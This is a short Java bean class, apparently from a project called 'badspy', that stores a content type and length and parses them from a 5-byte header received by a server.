package com.blogspot.sontx.badspy.badserver.bean;

import com.blogspot.sontx.badspy.badserver.Convert;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 20/4/2016.
 */
public class SpyDataHeader {
    public static final byte HEADER_FILE = 1;
    private byte contentType;
    private int contentLength;

    public static byte getHeaderFile() {
        return HEADER_FILE;
    }

    public byte getContentType() {
        return contentType;
    }

    public void setContentType(byte contentType) {
        this.contentType = contentType;
    }

    public int getContentLength() {
        return contentLength;
    }

    public void setContentLength(int contentLength) {
        this.contentLength = contentLength;
    }

    public static SpyDataHeader parse(byte[] bytes) {
        if (bytes == null || bytes.length != 5)
            return null;
        SpyDataHeader header = new SpyDataHeader();
        header.contentType = bytes[0];
        header.contentLength = Convert.bytesToInteger(bytes, 1);
        return header.contentLength < 0 ? null : header;
    }
}
